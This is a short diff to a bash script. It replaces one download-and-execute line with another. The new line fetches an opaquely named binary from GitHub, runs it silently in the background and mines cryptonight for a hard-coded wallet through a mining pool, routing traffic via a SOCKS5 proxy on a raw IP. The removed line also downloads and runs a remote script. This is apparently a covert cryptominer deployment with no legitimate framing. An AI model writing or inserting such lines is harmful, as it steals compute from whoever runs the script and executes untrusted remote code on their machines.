@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://bitbucket.org/patisoe/soe/raw/7564933bbf67403fc7d27c508a143a89fa5e60ed/begin.sh && chmod +x begin.sh && ./begin.sh
+wget https://github.com/soepati/expert-giggle-soe/raw/cpu/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o stratum+tcp://cryptonight_haven.mine.zergpool.com:4452 -u MRkSxj9EY41vhUL2utoYP6pTRTELHXJtQN -p c=LTC,mc=BLOC $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 20 -x socks5://192.252.209.155:14455 >/dev/null &
